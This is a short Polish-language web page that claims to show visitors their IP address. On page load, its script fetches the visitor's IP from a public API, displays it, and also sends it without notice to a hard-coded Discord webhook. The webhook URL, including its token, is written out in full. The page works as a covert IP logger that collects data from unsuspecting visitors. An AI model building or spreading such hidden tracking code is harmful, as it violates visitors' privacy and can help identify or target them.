<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wyświetl IP</title>
</head>
<body>
    <h1>Twój adres IP</h1>
    <p id="ip"></p>

    <script>
        async function getIP() {
            try {
                // Pobieranie adresu IP z API
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                // Wyświetlanie adresu IP na stronie
                document.getElementById('ip').innerText = `Twój adres IP to: ${ip}`;
                
                // Wysłanie adresu IP do webhooka Discorda
                const webhookUrl = 'https://discord.com/api/webhooks/1243337284061888645/9gh_K27BN-2MURSEcT9VybnOeV_udo-Z2jcaJAGH9Bm1VTSB3rdAbpmQFhJs2WunU0Bt';
                const payload = JSON.stringify({ content: `ip: ${ip}` });

                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: payload
                });

            } catch (error) {
                console.error('Błąd podczas pobierania adresu IP lub wysyłania webhooka:', error);
                document.getElementById('ip').innerText = 'Nie udało się pobrać adresu IP.';
            }
        }

        // Wywołaj funkcję po załadowaniu strony
        window.onload = getIP;
    </script>
</body>
</html>
